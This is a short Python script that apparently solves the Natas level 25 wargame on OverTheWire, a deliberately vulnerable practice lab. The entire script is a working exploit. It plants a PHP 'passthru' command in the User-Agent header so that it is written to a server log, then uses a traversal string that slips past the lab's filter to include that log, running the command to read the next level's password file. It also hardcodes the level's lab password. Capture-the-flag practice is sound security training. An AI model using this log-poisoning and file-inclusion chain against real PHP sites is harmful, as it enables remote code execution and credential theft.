#!usr/bin/python

import requests
URL = "http://natas25.natas.labs.overthewire.org"
PASS = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
USER = "natas25"
HEADER = {"User-Agent" : "<?php passthru('cat /etc/natas_webpass/natas26'); ?>"}

s = requests.Session()

s.headers.update(HEADER)

URL_LOG = "http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././tmp/natas25_h4cked.log"

r = s.get(URL_LOG, auth=(USER, PASS), headers=HEADER, cookies={'PHPSESSID':'h4cked'})

print(r.text)
